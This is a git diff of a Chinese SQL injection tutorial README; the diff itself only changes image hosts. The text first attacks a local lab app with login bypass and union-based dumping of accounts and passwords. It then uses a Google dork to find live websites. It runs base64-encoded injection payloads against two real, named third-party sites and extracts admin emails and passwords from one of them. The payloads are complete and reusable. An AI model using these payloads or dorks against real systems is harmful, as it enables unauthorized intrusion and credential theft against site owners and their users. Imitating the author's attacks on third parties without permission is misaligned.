@@ -64,7 +64,7 @@ test2 | 1234562
 
 * 启动服务器 ```node first/index.js```，访问```http://localhost:5000/```看到如下网页
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/first/first3.png"/>
+  <img src="http://139.129.42.180/images/ComputerVirus/first/first3.png"/>
 </div>
 
 * 输入 account : ```test0```, password : ```1234560```，可以发现登录成功
@@ -92,7 +92,7 @@ select * from users where account = '' or 1=1 #' and password='test'
 #### 准备工作
 * 编写models/Article和models/migrate.js定义如下图所示的Articles表：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second1.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second1.png" height = "auto" alt="图片名称" align=center />
 </div> 
 * 执行```node models/migrate```初始化数据库
 * 编写路由代码：
@@ -117,14 +117,14 @@ router.get("/article",function *(){
 
 * 启动服务器 ```node first/index.js```，访问```http://localhost:3030/article?id=1```，可以看到如下图所示的界面：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second2.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second2.png" height = "auto" alt="图片名称" align=center />
 </div> 
 
 #### 实践
 * 访问 ```http://localhost:3030/article？id=3/*ABC*/```，可以发现返回的页面没有变化，这说明后台对输入没有过滤，这里是可以注入的。
 * 确认页面可以注入后，访问```http://localhost:3030/article?id=3 and 1=2```，可以发现页面显示没有文章，因为1=2的判断导致SQL的Where子句永远为false，所以没有文章返回。
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second3.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second3.png" height = "auto" alt="图片名称" align=center />
 </div> 
 * 使用union子句得到当前文章所在表的列数，从1开始测，依次访问以下网址
 ```
@@ -136,16 +136,16 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5
 ```
 前四步都显示：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second4.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second4.png" height = "auto" alt="图片名称" align=center />
 </div> 
 这是因为union两头连接的表的字段数不一致，所以SQL语句执行结果是错误的。而访问```http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5```成功，这是因为Articles表的列数就是5，访问这样的网址，后台实际执行的SQL语句及其结果如下图所示：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second5.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second5.png" height = "auto" alt="图片名称" align=center />
 </div> 
 
 * 访问```http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5```，我们发现页面展示的还是id=3的文章，查看路由处理的代码：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second6.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second6.png" height = "auto" alt="图片名称" align=center />
 </div> 
 可以发现，默认返回的是第一条数据，所以我们加一个order by id DESC就可以看到别的数据了：
 ```
@@ -153,12 +153,12 @@ http://localhost:3030/article?id=3 and 1=1 union select 10000,2,3,4,5 order by i
 ```
 访问上述网址，后台执行的SQL语句及其结果如下图所示
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second7.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second7.png" height = "auto" alt="图片名称" align=center />
 </div> 
 
 所以页面的返回结果是：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second8.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second8.png" height = "auto" alt="图片名称" align=center />
 </div> 
 
 我们可以看到我们传给后端的2，3分别在这里被展示在了页面上。
@@ -169,7 +169,7 @@ http://localhost:3030/article?id=3 and 1=1 union select 10000,version(),database
 ```
 我们就可以看到数据库的版本和数据表的名称：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second9.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second9.png" height = "auto" alt="图片名称" align=center />
 </div> 
 这里记下virustest这个数据库的名称。
 
@@ -179,7 +179,7 @@ http://localhost:3030/article?id=3 and 1=1 union select 10000,2,TABLE_NAME,4,5 F
 ```
 其中的```order by rand()```可以帮助我们随机地看到数据库中有哪些表，我们多访问几次，就可以看到有一个Users表：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second10.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second10.png" height = "auto" alt="图片名称" align=center />
 </div> 
 这个Users表就非常有用，我们来继续注入，尝试着拿到用户名和密码。
 
@@ -189,10 +189,10 @@ http://localhost:3030/article?id=3 and 1=1 union SELECT 10000,COLUMN_NAME,3,4,5 
 ```
 由于有```order by rand()```，多访问几次，我们就可以陆续看到所有的列名，有两个字段我们比较感兴趣：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second11.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second11.png" height = "auto" alt="图片名称" align=center />
 </div> 
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second12.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second12.png" height = "auto" alt="图片名称" align=center />
 </div> 
 记住“account”字段和“password”字段
 
@@ -202,7 +202,7 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 f
 ```
 访问结果如下图所示：
 <div align="center">
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second13.png" height = "auto" alt="图片名称" align=center />
+<img src="http://139.129.42.180/images/ComputerVirus/second/images/second13.png" height = "auto" alt="图片名称" align=center />
 </div> 
 不断访问这个网址，就可以陆续看到数据库中的所有用户名和密码。
 
@@ -210,7 +210,7 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 f
 #### 搜索引擎的使用
 使用Google搜索```inurl:.php?id=MTM=```，这里inurl指的是在url内有后面字符串的网站，后面的id=MTM=是指base64加密后的id=13，表明网站对URL进行了base64处理。Google查询出来结果如下：
 <div align=center>
-<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third1.png" />
+<img src="http://139.129.42.180/images/ComputerVirus/third/images/third1.png" />
 </div>
 
 我自己经过删选测试，选取了两个网站：
@@ -229,62 +229,62 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 f
 #### 第一个网站的SQL注入
 * 测试是否能被注入，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==)，base64串的含义是```id=13 and 1=2```，返回的结果如下图，表明是此网站可以注入的
 <div align=center> 
- <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third2.png" />
+ <img src="http://139.129.42.180/images/ComputerVirus/third/images/third2.png" />
 </div>
 * 通过union测表的列数，我们从1到30挨个测，最后测试出来表的列数是15，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=)，base64串的含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，结果如下图所示，可以看到有页面有九个显示位，显示位很多，就不需要concat()函数将多条数据拼接到一起了
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third3.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third3.png" />
 </div>
 * 通过mysql函数得到数据库的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1)，base64串的含义是```id=13 and 1=1 union select 1,database(),3,4,5,6,7,8,9,10,version(),12,13,14,15```，我们可以看到如下图的结果，表明数据库的名称是csearch，版本是4.0.25
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third4.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third4.png" />
 </div>
 * 通过INFORMATION_SCHEMA查询表的名称和表内行的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg)，base64串的含义是```id=13 and 1=1 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_shcema```，结果竟然是没有权限！！！
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third5.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third5.png" />
 </div>
 进行到这里，发现这个数据库用户没有足够的权限，我决定放弃，盲注猜表名和错误回显法的耗时较长，同时这个网站应该主要是用来搜索，我尝试了没有找到users表和admins表就放弃了。
 
 #### 第二个网站的SQL注入
 * 测试能否被注入，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==)，base64串的含义是```id=13 and 1=2```，结果如下，可以发现页面没有显示，证明是可以注入的
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third9.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third9.png" />
 </div>
 
 * 通过union测表的列数，从1到30挨个测试，最后得知列数是7，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==)，结果如下图所示，可以看到有三个显示位
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third10.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third10.png" />
 </div>
 
 * 通过mysql函数得到数据库的名称，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3)，base64串的含义是```id=14 and 1=2 union select 1,database(),version(),4,5,6,7```，访问结果如下图，得到数据库的名称是zaaffran_zaaffran，数据库版本是5.5.2
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third11.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third11.png" />
 </div>
 
 * 通过INFORMATION_SCHEMA查询表的名称和表内行的名称,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=)，base64串的含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables```，可以看到五个数据表：
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third12.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third12.png" />
 </div>
 
 * 由于这里只显示了五张表，而且都是系统自带的表，对我来说没有什么用处，于是尝试了使用order by table_type，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==)，base64串的含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by table_type```
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third13.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third13.png" />
 </div>
 可以发现网页报错，我判断系统后面加入了```limit 5```这个子句，由于SQL语法不允许```order by```子句在```limit```子句前面，所以网站发生了错误。
 
 * 访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=)，base64串含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by 1#```，这次显示结果如下，成功了！
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third14.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third14.png" />
 </div>
 
 * 同时我们搜索到了adminusers表这个敏感的表，我决定对这个表进行查询，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==)，base64含义是```14 and 1=2 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='adminusers' order by 1#```，可以看到如下图所有的表段
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third15.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third15.png" />
 </div>
 
 * 获取想要的数据,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==)，base64串含义是```14 and 1=2 union select 1,2,UserEmail,UserPassword,5,6,7 from adminusers#```,可以看到adminusers表里面的所有数据
 <div align=center>
-  <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third16.png" />
+  <img src="http://139.129.42.180/images/ComputerVirus/third/images/third16.png" />
 </div>
 
 ### 总结
